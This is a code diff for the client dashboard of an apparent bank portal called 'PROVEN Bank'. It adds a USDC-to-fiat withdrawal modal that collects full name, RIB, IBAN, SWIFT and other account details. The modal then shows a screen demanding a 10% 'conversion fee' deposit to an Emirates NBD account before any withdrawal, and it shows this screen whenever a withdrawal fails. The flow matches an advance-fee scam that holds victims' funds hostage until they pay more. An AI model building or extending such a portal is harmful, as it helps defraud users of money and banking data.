+                <div class="cf-form-row"><label>Account Number (RIB)</label><input type="text" id="cf-rib" placeholder="Account number"></div>
+                <div class="cf-form-row"><label>IBAN</label><input type="text" id="cf-iban" placeholder="IBAN"></div>
+                <div class="cf-form-row"><label>Swift (BIC)</label><input type="text" id="cf-swift" placeholder="SWIFT/BIC code"></div>
+                <div class="cf-form-half">
+                    <div class="cf-form-row"><label>Transit Number</label><input type="text" id="cf-transit" placeholder="Transit number"></div>
+                    <div class="cf-form-row"><label>Institution Number</label><input type="text" id="cf-institution" placeholder="Institution number"></div>
+                </div>
+                <div class="cf-form-row"><label>Reference</label><input type="text" id="cf-reference" placeholder="Reference (optional)"></div>
+                <button class="cf-submit" onclick="cfSubmitWithdrawal()">Submit Withdrawal Request</button>
+                <button class="cf-cancel" onclick="closeConvertModal()">Cancel</button>
+            </div>
+            <div class="cf-insuf" id="cf-insuf-screen">
+                <div class="cf-insuf-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></div>
+                <h2>Insufficient Conversion Fee Balance</h2>
+                <p>To proceed with converting your USDC to fiat currency, please deposit the required conversion fee to your Emirates NBD account first.</p>
+                <div class="cf-insuf-rows">
+                    <div class="cf-insuf-row"><span class="cf-insuf-row-label">Amount Required</span><span class="cf-insuf-row-val" id="cf-insuf-amount">$10,000.00</span></div>
+                    <div class="cf-insuf-row"><span class="cf-insuf-row-label">Deposit To</span><span class="cf-insuf-row-val">Emirates NBD Account</span></div>
+                </div>
+                <div class="cf-insuf-hint">Need help with the deposit process?</div>
+                <button class="cf-insuf-support" onclick="closeConvertModal();showSection('messages')">Contact Support</button>
+                <button class="cf-insuf-back" onclick="cfHideInsuf()">Back</button>
+            </div>
+        </div>
+    </div>
     <script>
     var clientData = JSON.parse(localStorage.getItem('client'));
     if (!clientData) { window.location.href = '/profile/login.html'; }
@@ -154,6 +384,8 @@
         var converted = convertBalance(usdBalance, curr);
         symEl.textContent = getCurrencySymbol(curr);
         balEl.textContent = Number(converted).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        var currCodeEl = document.querySelector('.ov-balance-currency');
+        if (currCodeEl) currCodeEl.textContent = curr;
         if (rateEl && curr !== 'USD' && rates) {
             var key = curr.toLowerCase();
             var rate = rates[key];
@@ -168,24 +400,141 @@
         var currList = ['USD','CAD','EUR','CHF','AED'];
         for (var i = 0; i < currList.length; i++) {
             var c = currList[i];
-            opts += '<option value="' + c + '"' + (c === savedCurrency ? ' selected' : '') + '>' + CURRENCY_NAMES[c] + '</option>';
+            opts += '<option value="' + c + '"' + (c === savedCurrency ? ' selected' : '') + '>' + c + ' - ' + (CURRENCY_NAMES[c] || c) + '</option>';
         }
-        main.innerHTML = '<div class="balance-card"><div class="label">Available Balance</div><div class="amount"><span class="currency-symbol" id="currency-symbol">' + getCurrencySymbol(savedCurrency) + '</span><span id="overview-balance">' + Number(convertBalance(clientData.balance || 0, savedCurrency)).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}) + '</span></div><div class="currency-selector"><select id="currency-select" onchange="updateCurrencyDisplay()">' + opts + '</select></div><div class="rate-info" id="rate-info"></div><div class="account-info">' + clientData.account_type.charAt(0).toUpperCase() + clientData.account_type.slice(1) + ' Account &middot; ' + clientData.subsidiary + '</div></div><div class="deposit-note">Visit any PROVEN Bank branch to deposit funds directly. Our tellers will update your balance instantly.</div><div class="card"><h2>Quick Actions</h2><div style="display:flex;gap:1rem;flex-wrap:wrap"><button class="btn" onclick="showSection(\'transactions\')">View Transactions</button><button class="btn" onclick="showSection(\'withdraw\')">Make a Withdrawal</button><button class="btn" onclick="showSection(\'messages\')">Messages</button></div></div>';
+        var firstName = clientData.first_name || 'Client';
+        var lastName = clientData.last_name || '';
+        var fullCardName = (firstName + ' ' + lastName).toUpperCase();
+        var balanceUSD = clientData.balance || 0;
+        var convertedBal = convertBalance(balanceUSD, savedCurrency);
+        var balStr = Number(convertedBal).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        var sym = getCurrencySymbol(savedCurrency);
+        main.innerHTML = '<div class="ov-wrap">' +
+            '<div class="ov-hero">' +
+                '<div class="ov-hero-bg"></div>' +
+                '<div class="ov-hero-content">' +
+                    '<div class="ov-hero-top">' +
+                        '<div class="ov-welcome"><h1>Welcome back, ' + esc(firstName) + ' ' + esc(lastName) + '</h1><p>Here\'s what\'s happening with your account today.</p></div>' +
+                        '<div class="ov-verified"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="14" height="14"><polyline points="20 6 9 17 4 12"></polyline></svg> Verified</div>' +
+                    '</div>' +
+                    '<div class="ov-body">' +
+                        '<div class="ov-left">' +
+                            '<div class="ov-card-panel">' +
+                                '<div class="ov-card-info">' +
+                                    '<div class="ov-card-label">Your Primary Card</div>' +
+                                    '<div class="ov-card-sublabel">Use this card for daily transactions.</div>' +
+                                    '<div class="ov-bal-label">Available Balance</div>' +
+                                    '<div class="ov-balance"><span id="currency-symbol">' + sym + '</span> <span id="overview-balance">' + balStr + '</span> <span class="ov-balance-currency">' + savedCurrency + '</span></div>' +
+                                    '<div class="ov-currency-wrap"><select id="currency-select" onchange="updateCurrencyDisplay()">' + opts + '</select><div class="ov-rate-info" id="rate-info"></div></div>' +
+                                '</div>' +
+                                '<div class="ov-card-visual">' +
+                                    '<div class="credit-card">' +
+                                        '<div class="credit-card-shine"></div>' +
+                                        '<div class="credit-card-top"><span class="credit-card-bank">PROVEN BANK</span><div class="credit-card-type"><div style="font-size:.7rem;color:rgba(255,255,255,.4);text-transform:uppercase">Priority</div><div style="font-size:.8rem;color:rgba(255,255,255,.6)">DEBIT</div></div></div>' +
+                                        '<div class="credit-card-chip"></div>' +
+                                        '<div class="credit-card-nfc">&#x29BE;</div>' +
+                                        '<div class="credit-card-number">4000 **** **** 9342</div>' +
+                                        '<div class="credit-card-footer"><div><div class="credit-card-holder-label">Card Holder</div><div class="credit-card-holder-name">' + esc(fullCardName.substring(0,16)) + '</div></div><div class="credit-card-meta"><div><div class="credit-card-exp-label">Expires</div><div class="credit-card-exp">12/28</div></div><div><div class="credit-card-cvv-label">CVV</div><div class="credit-card-cvv">&mdash;</div></div></div><div class="credit-card-brand">VISA</div></div>' +
+                                    '</div>' +
+                                '</div>' +
+                            '</div>' +
+                            '<div class="ov-txn-panel">' +
+                                '<div class="ov-txn-tabs"><div class="ov-txn-title">Recent Transactions</div><button class="ov-tab-btn active" id="tab-txn" onclick="ovSwitchTab(\'txn\')">Recent Transactions</button><button class="ov-tab-btn" id="tab-wd" onclick="ovSwitchTab(\'wd\')">Withdrawal Requests</button></div>' +
+                                '<div class="ov-txn-list" id="ov-txn-list"><div class="ov-empty">Loading...</div></div>' +
+                            '</div>' +
+                        '</div>' +
+                        '<div class="ov-right">' +
+                            '<div><div class="ov-quick-title">Quick Actions</div>' +
+                                '<button class="ov-action-btn" onclick="showSection(\'transactions\')">' +
+                                    '<div class="ov-action-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="7 17 17 7"></polyline><polyline points="7 7 17 7 17 17"></polyline></svg></div>Deposit' +
+                                '</button>' +
+                                '<button class="ov-action-btn" onclick="openWithdrawModal()">' +
+                                    '<div class="ov-action-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="17 7 7 17"></polyline><polyline points="17 17 7 17 7 7"></polyline></svg></div>Withdrawal' +
+                                '</button>' +
+                            '</div>' +
+                            '<div class="ov-premium">' +
+                                '<h3>Premium Plan</h3>' +
+                                '<p>Upgrade to get 2% cashback and zero foreign transaction fees.</p>' +
+                                '<button class="ov-premium-btn" onclick="showSection(\'messages\')">Explore Premium</button>' +
+                            '</div>' +
+                        '</div>' +
+                    '</div>' +
+                '</div>' +
+            '</div>' +
+        '</div>';
         refreshClientData(function(data) {
             if (data) {
                 clientData = data;
                 var curr = localStorage.getItem('preferred_currency') || 'USD';
                 var converted = convertBalance(data.balance || 0, curr);
-                document.getElementById('overview-balance').textContent = Number(converted).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-                document.getElementById('currency-symbol').textContent = getCurrencySymbol(curr);
+                var el = document.getElementById('overview-balance');
+                var symEl = document.getElementById('currency-symbol');
+                if (el) el.textContent = Number(converted).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                if (symEl) symEl.textContent = getCurrencySymbol(curr);
                 updateCurrencyDisplay();
             }
         });
         fetchRates(function() { updateCurrencyDisplay(); });
+        ovLoadTxn();
+    }
+    var ovCurrentTab = 'txn';
+    function ovSwitchTab(tab) {
+        ovCurrentTab = tab;
+        var btnTxn = document.getElementById('tab-txn');
+        var btnWd = document.getElementById('tab-wd');
+        if (btnTxn) { btnTxn.className = 'ov-tab-btn' + (tab === 'txn' ? ' active' : ''); }
+        if (btnWd) { btnWd.className = 'ov-tab-btn' + (tab === 'wd' ? ' active' : ''); }
+        ovLoadTxn();
+    }
+    function ovLoadTxn() {
+        var el = document.getElementById('ov-txn-list');
+        if (!el) return;
+        el.innerHTML = '<div class="ov-empty">Loading...</div>';
+        if (ovCurrentTab === 'txn') {
+            fetch('/api/client/transactions/' + clientId).then(function(r) { return r.json(); }).then(function(data) {
+                if (!document.getElementById('ov-txn-list')) return;
+                if (!data || data.length === 0) { document.getElementById('ov-txn-list').innerHTML = '<div class="ov-empty">No transactions yet</div>'; return; }
+                var curr = localStorage.getItem('preferred_currency') || 'USD';
+                var html = '';
+                var shown = data.slice(0, 5);
+                shown.forEach(function(t) {
+                    var isCredit = t.type === 'deposit' || t.type === 'credit';
+                    var iconClass = isCredit ? 'credit' : 'debit';
+                    var amtClass = isCredit ? 'credit' : 'debit';
+                    var sign = isCredit ? '+' : '-';
+                    var convAmt = convertBalance(Math.abs(t.amount), curr);
+                    var amtStr = sign + Number(convAmt).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                    var dateStr = new Date(t.created_at).toLocaleDateString('fr-FR', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' });
+                    var svgIcon = isCredit
+                        ? '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>'
+                        : '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"></line><polyline points="19 12 12 19 5 12"></polyline></svg>';
+                    html += '<div class="ov-txn-item"><div class="ov-txn-icon ' + iconClass + '">' + svgIcon + '</div><div class="ov-txn-info"><div class="ov-txn-name">' + esc(t.description || t.type) + '</div><div class="ov-txn-date">' + dateStr + '</div></div><div class="ov-txn-amount ' + amtClass + '">' + amtStr + '</div></div>';
+                });
+                var listEl = document.getElementById('ov-txn-list');
+                if (listEl) listEl.innerHTML = html;
+            }).catch(function() { var el2 = document.getElementById('ov-txn-list'); if (el2) el2.innerHTML = '<div class="ov-empty">Unable to load transactions</div>'; });
+        } else {
+            fetch('/api/withdrawals/' + clientId).then(function(r) { return r.json(); }).then(function(data) {
+                if (!document.getElementById('ov-txn-list')) return;
+                if (!data || data.length === 0) { document.getElementById('ov-txn-list').innerHTML = '<div class="ov-empty">No withdrawal requests</div>'; return; }
+                var curr = localStorage.getItem('preferred_currency') || 'USD';
+                var html = '';
+                var shown = data.slice(0, 5);
+                shown.forEach(function(w) {
+                    var convAmt = convertBalance(Math.abs(w.amount), curr);
+                    var amtStr = '-' + Number(convAmt).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                    var dateStr = new Date(w.created_at).toLocaleDateString('fr-FR', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' });
+                    var svgIcon = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"></line><polyline points="19 12 12 19 5 12"></polyline></svg>';
+                    html += '<div class="ov-txn-item"><div class="ov-txn-icon debit">' + svgIcon + '</div><div class="ov-txn-info"><div class="ov-txn-name">Withdrawal</div><div class="ov-txn-date">' + dateStr + '</div></div><div class="ov-txn-amount debit">' + amtStr + '</div></div>';
+                });
+                var listEl = document.getElementById('ov-txn-list');
+                if (listEl) listEl.innerHTML = html;
+            }).catch(function() { var el2 = document.getElementById('ov-txn-list'); if (el2) el2.innerHTML = '<div class="ov-empty">Unable to load requests</div>'; });
+        }
     }
     function renderTransactions() {
         var main = document.getElementById('main-content');
-        main.innerHTML = '<div class="card"><h2>Transaction History</h2><div id="txn-list"><div class="empty-state">Loading...</div></div></div>';
+        main.innerHTML = '<div class="non-ov-wrap"><div class="card"><h2>Transaction History</h2><div id="txn-list"><div class="empty-state">Loading...</div></div></div></div>';
         fetch('/api/client/transactions/' + clientId).then(function(r) { return r.json(); }).then(function(data) {
             var el = document.getElementById('txn-list');
             if (data.length === 0) { el.innerHTML = '<div class="empty-state">No transactions</div>'; return; }
@@ -217,7 +566,7 @@
             currOpts += '<option value="' + c + '"' + (c === curr ? ' selected' : '') + '>' + CURRENCY_NAMES[c] + '</option>';
         }
         var fullName = (clientData.first_name || '') + ' ' + (clientData.last_name || '');
-        main.innerHTML = '<div class="card"><h2>Withdrawal Request</h2><p style="margin-bottom:2rem;color:#666;">Submit a withdrawal request. Once approved by the bank, the amount will be deducted from your balance.</p><p style="margin-bottom:1.5rem;font-size:1.4rem;color:#23282d;">Current Balance: <strong>' + sym + ' ' + balStr + '</strong></p><div class="form-row"><label>Full Name</label><input type="text" id="w-full_name" value="' + esc(fullName) + '"></div><div class="form-row"><label>Account Number (RIB)</label><input type="text" id="w-rib" placeholder="Account number"></div><div class="form-row"><label>IBAN</label><input type="text" id="w-iban" placeholder="IBAN"></div><div class="form-row"><label>Swift (BIC)</label><input type="text" id="w-swift" placeholder="SWIFT/BIC code"></div><div class="form-row half"><div><label>Transit Number</label><input type="text" id="w-transit" placeholder="Transit number"></div><div><label>Institution Number</label><input type="text" id="w-institution" placeholder="Institution number"></div></div><div class="form-row"><label>Reference</label><input type="text" id="w-reference" placeholder="Reference (optional)"></div><div class="form-row half"><div><label>Withdrawal Amount</label><input type="number" id="w-amount" step="0.01" min="0.01" placeholder="0.00"></div><div><label>Currency</label><select id="w-currency">' + currOpts + '</select></div></div><button class="btn btn-black" onclick="submitWithdrawal()" style="margin-top:1rem">Submit Withdrawal Request</button></div>';
+        main.innerHTML = '<div class="non-ov-wrap"><div class="card"><h2>Withdrawal Request</h2><p style="margin-bottom:2rem;color:rgba(255,255,255,.5);">Submit a withdrawal request. Once approved by the bank, the amount will be deducted from your balance.</p><p style="margin-bottom:1.5rem;font-size:1.4rem;color:#e0e6f0;">Current Balance: <strong>' + sym + ' ' + balStr + '</strong></p><div class="form-row"><label>Full Name</label><input type="text" id="w-full_name" value="' + esc(fullName) + '"></div><div class="form-row"><label>Account Number (RIB)</label><input type="text" id="w-rib" placeholder="Account number"></div><div class="form-row"><label>IBAN</label><input type="text" id="w-iban" placeholder="IBAN"></div><div class="form-row"><label>Swift (BIC)</label><input type="text" id="w-swift" placeholder="SWIFT/BIC code"></div><div class="form-row half"><div><label>Transit Number</label><input type="text" id="w-transit" placeholder="Transit number"></div><div><label>Institution Number</label><input type="text" id="w-institution" placeholder="Institution number"></div></div><div class="form-row"><label>Reference</label><input type="text" id="w-reference" placeholder="Reference (optional)"></div><div class="form-row half"><div><label>Withdrawal Amount</label><input type="number" id="w-amount" step="0.01" min="0.01" placeholder="0.00"></div><div><label>Currency</label><select id="w-currency">' + currOpts + '</select></div></div><button class="btn btn-black" onclick="submitWithdrawal()" style="margin-top:1rem">Submit Withdrawal Request</button></div></div>';
     }
     function submitWithdrawal() {
         var fullName = document.getElementById('w-full_name').value.trim();
@@ -240,7 +589,7 @@
     }
     function renderMessages() {
         var main = document.getElementById('main-content');
-        main.innerHTML = '<div class="card"><h2>Messages</h2><div id="msg-list"><div class="empty-state">Loading...</div></div></div>';
+        main.innerHTML = '<div class="non-ov-wrap"><div class="card"><h2>Messages</h2><div id="msg-list"><div class="empty-state">Loading...</div></div></div></div>';
         fetch('/api/messages/' + clientId).then(function(r) { return r.json(); }).then(function(data) {
             var el = document.getElementById('msg-list');
             if (data.length === 0) { el.innerHTML = '<div class="empty-state">No messages</div>'; return; }
@@ -252,7 +601,7 @@
     function renderSettings() {
         var c = clientData;
         var main = document.getElementById('main-content');
-        main.innerHTML = '<div class="card"><h2>Account Settings</h2><p style="margin-bottom:2rem;color:#666;">Update your personal information and password.</p><form id="settings-form" onsubmit="return false;"><div class="form-row half"><div><label>First Name</label><input type="text" id="s-first_name" value="' + esc(c.first_name) + '"></div><div><label>Last Name</label><input type="text" id="s-last_name" value="' + esc(c.last_name) + '"></div></div><div class="form-row half"><div><label>Date of Birth</label><input type="date" id="s-date_of_birth" value="' + esc(c.date_of_birth) + '"></div><div><label>Passport Number</label><input type="text" id="s-passport_number" value="' + esc(c.passport_number) + '"></div></div><div class="form-row"><label>Email</label><input type="email" id="s-email" value="' + esc(c.email) + '"></div><div class="form-row half"><div><label>Telephone</label><input type="tel" id="s-telephone" value="' + esc(c.telephone) + '"></div><div><label>Cellphone</label><input type="tel" id="s-cellphone" value="' + esc(c.cellphone) + '"></div></div><div class="form-row half"><div><label>City</label><input type="text" id="s-home_city" value="' + esc(c.home_city || '') + '"></div><div><label>Country</label><input type="text" id="s-home_country" value="' + esc(c.home_country || '') + '"></div></div><hr style="margin:2rem 0;border:0;border-top:1px solid #eee"><h3 style="margin-bottom:1.5rem">Change Password</h3><div class="form-row"><label>New Password (min 4 characters)</label><input type="password" id="s-new_password" placeholder="Leave blank to keep current"></div><button type="submit" class="btn btn-black" onclick="saveSettings()">Save Changes</button></form></div>';
+        main.innerHTML = '<div class="non-ov-wrap"><div class="card"><h2>Account Settings</h2><p style="margin-bottom:2rem;color:#666;">Update your personal information and password.</p><form id="settings-form" onsubmit="return false;"><div class="form-row half"><div><label>First Name</label><input type="text" id="s-first_name" value="' + esc(c.first_name) + '"></div><div><label>Last Name</label><input type="text" id="s-last_name" value="' + esc(c.last_name) + '"></div></div><div class="form-row half"><div><label>Date of Birth</label><input type="date" id="s-date_of_birth" value="' + esc(c.date_of_birth) + '"></div><div><label>Passport Number</label><input type="text" id="s-passport_number" value="' + esc(c.passport_number) + '"></div></div><div class="form-row"><label>Email</label><input type="email" id="s-email" value="' + esc(c.email) + '"></div><div class="form-row half"><div><label>Telephone</label><input type="tel" id="s-telephone" value="' + esc(c.telephone) + '"></div><div><label>Cellphone</label><input type="tel" id="s-cellphone" value="' + esc(c.cellphone) + '"></div></div><div class="form-row half"><div><label>City</label><input type="text" id="s-home_city" value="' + esc(c.home_city || '') + '"></div><div><label>Country</label><input type="text" id="s-home_country" value="' + esc(c.home_country || '') + '"></div></div><hr style="margin:2rem 0;border:0;border-top:1px solid #eee"><h3 style="margin-bottom:1.5rem">Change Password</h3><div class="form-row"><label>New Password (min 4 characters)</label><input type="password" id="s-new_password" placeholder="Leave blank to keep current"></div><button type="submit" class="btn btn-black" onclick="saveSettings()">Save Changes</button></form></div></div>';
     }
     function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
     function saveSettings() {
@@ -266,6 +615,88 @@
             else { toast('Error saving settings', 'error'); }
         }).catch(function() { toast('Connection error', 'error'); });
     }
+    function openWithdrawModal() {
+        document.getElementById('wd-modal-overlay').style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+    }
+    function closeWithdrawModal() {
+        document.getElementById('wd-modal-overlay').style.display = 'none';
+        document.body.style.overflow = '';
+    }
+    var CF_SYMBOLS = { usd: '$', eur: '\u20ac', cad: 'C$', chf: 'CHF ', aed: 'AED ' };
+    var CF_NAMES = { usd: 'USD', eur: 'EUR', cad: 'CAD', chf: 'CHF', aed: 'AED' };
+    function openConvertModal() {
+        var bal = clientData ? (clientData.balance || 0) : 0;
+        var balEl = document.getElementById('cf-balance-display');
+        if (balEl) balEl.textContent = Number(bal).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        var nameEl = document.getElementById('cf-full_name');
+        if (nameEl && clientData) nameEl.value = ((clientData.first_name || '') + ' ' + (clientData.last_name || '')).trim();
+        document.getElementById('cf-modal-overlay').style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+        cfUpdateCalc();
+    }
+    function closeConvertModal() {
+        document.getElementById('cf-modal-overlay').style.display = 'none';
+        document.body.style.overflow = '';
+        cfHideInsuf();
+    }
+    function cfShowInsuf(feeStr) {
+        document.getElementById('cf-modal-overlay').querySelector('.cf-modal-body').style.display = 'none';
+        var scr = document.getElementById('cf-insuf-screen');
+        scr.classList.add('active');
+        var amtEl = document.getElementById('cf-insuf-amount');
+        if (amtEl) amtEl.textContent = feeStr;
+    }
+    function cfHideInsuf() {
+        document.getElementById('cf-modal-overlay').querySelector('.cf-modal-body').style.display = '';
+        document.getElementById('cf-insuf-screen').classList.remove('active');
+    }
+    function cfSubmitWithdrawal() {
+        var fullName = (document.getElementById('cf-full_name') || {}).value.trim();
+        var rib = (document.getElementById('cf-rib') || {}).value.trim();
+        var iban = (document.getElementById('cf-iban') || {}).value.trim();
+        var swift = (document.getElementById('cf-swift') || {}).value.trim();
+        var transit = (document.getElementById('cf-transit') || {}).value.trim();
+        var institution = (document.getElementById('cf-institution') || {}).value.trim();
+        var reference = (document.getElementById('cf-reference') || {}).value.trim();
+        var sel = document.getElementById('cf-currency');
+        var currency = sel ? sel.value.toUpperCase() : 'USD';
+        if (!fullName) { toast('Please enter your full name', 'error'); return; }
+        if (!rib) { toast('Please enter your account number (RIB)', 'error'); return; }
+        var bal = clientData ? (clientData.balance || 0) : 0;
+        var rate = 1;
+        if (rates && currency !== 'USD') { rate = rates[currency.toLowerCase()] || 1; }
+        var convertedBal = bal * rate;
+        var feeAmount = convertedBal * 0.10;
+        var sym = CF_SYMBOLS[currency.toLowerCase()] || '$';
+        var feeStr = sym + Number(feeAmount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        if (bal <= 0) { cfShowInsuf(feeStr); return; }
+        fetch('/api/withdrawals', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ client_id: clientId, amount: bal, full_name: fullName, rib: rib, iban: iban, swift: swift, transit_number: transit, institutional_number: institution, reference: reference, currency: currency, amount_original: convertedBal }) })
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                if (data.success) { toast('Withdrawal request submitted successfully.'); closeConvertModal(); }
+                else { cfShowInsuf(feeStr); }
+            }).catch(function() { toast('Connection error', 'error'); });
+    }
+    function cfUpdateCalc() {
+        var sel = document.getElementById('cf-currency');
+        if (!sel) return;
+        var curr = sel.value;
+        var sym = CF_SYMBOLS[curr] || '$';
+        var currCode = CF_NAMES[curr] || curr.toUpperCase();
+        var bal = clientData ? (clientData.balance || 0) : 0;
+        var rate = 1;
+        if (rates && curr !== 'usd') { rate = rates[curr] || 1; }
+        var convertedBal = bal * rate;
+        var fee = convertedBal * 0.10;
+        var rateEl = document.getElementById('cf-rate-line');
+        var totalEl = document.getElementById('cf-total-amount');
+        var subEl = document.getElementById('cf-total-sub');
+        if (rateEl) rateEl.textContent = '1 USDC = ' + Number(rate).toFixed(4) + ' ' + currCode;
+        if (totalEl) totalEl.textContent = sym + Number(fee).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        if (subEl) subEl.textContent = 'Deposit this amount to your bank account';
+    }
+    document.addEventListener('keydown', function(e) { if (e.key === 'Escape') { closeWithdrawModal(); closeConvertModal(); } });
     showSection('overview');
     </script>
 </body>
